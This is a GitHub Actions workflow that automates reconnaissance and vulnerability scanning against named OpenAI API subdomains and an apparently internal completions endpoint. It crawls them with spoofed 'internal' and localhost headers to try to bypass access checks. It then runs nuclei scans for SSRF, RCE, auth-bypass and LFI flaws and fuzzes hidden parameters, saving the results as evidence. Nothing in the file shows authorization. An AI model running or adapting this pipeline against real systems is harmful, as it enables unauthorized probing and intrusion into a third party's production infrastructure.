name: OpenAI-Complete-Goldmine-Hunter
on:
  workflow_dispatch:

jobs:
  exploit-hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Advanced Arsenal
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          pip install arjun
          sudo mv ~/go/bin/* /usr/local/bin/

      - name: Phase 1:High-Value Target Injection
        run: |
          # We focus on the 'Unified' and 'Internal' endpoints you discovered
          cat <<EOF > targets.txt
          admin.unified-8.api.openai.com
          chat-onramp.unified-5.api.openai.com
          higherlevelapi.unified-8.api.openai.com
          unified-79.api.openai.com
          api.openai.com/v1/completionsinternal
          EOF
          httpx -l targets.txt -silent -sc -title -o live_targets.txt

      - name: Phase 2:Active Path Fuzzing & Bypass Testing
        run: |
          # We use Katana to find hidden paths on those 404/403 endpoints
          # We inject 'internal' headers to see if the 404 turns into a 200
          katana -list live_targets.txt -jc -kf all -d 3 -rl 10 \
          -H "X-OpenAI-Internal: true" \
          -H "X-Forwarded-For: 127.0.0.1" \
          -o all_endpoints.txt

      - name: Phase 3:Targeted CVE & Logic Scan
        run: |
          # 1. Nuclei: Testing for SSRF, RCE, and Auth Bypass CVEs
          # We use specific tags for API vulnerabilities (CVE-2024-XXXX patterns)
          nuclei -l all_endpoints.txt -tags cve,ssrf,rce,auth-bypass,lfi -severity critical,high -rl 5 -o nuclei_results.txt || true
          
          # 2. Arjun: Fuzzing the 'completionsinternal' for hidden required parameters
          # Often a 404 is returned if a 'required' parameter is missing
          arjun -u "https://api.openai.com/v1/completionsinternal" --rate-limit 2 -oJ "internal_params.json" || true

      - name: Archive Critical Evidence
        uses: actions/upload-artifact@v4
        with:
          name: openai-high-cve-results
          path: |
            nuclei_results.txt
            all_endpoints.txt
            internal_params.json
            
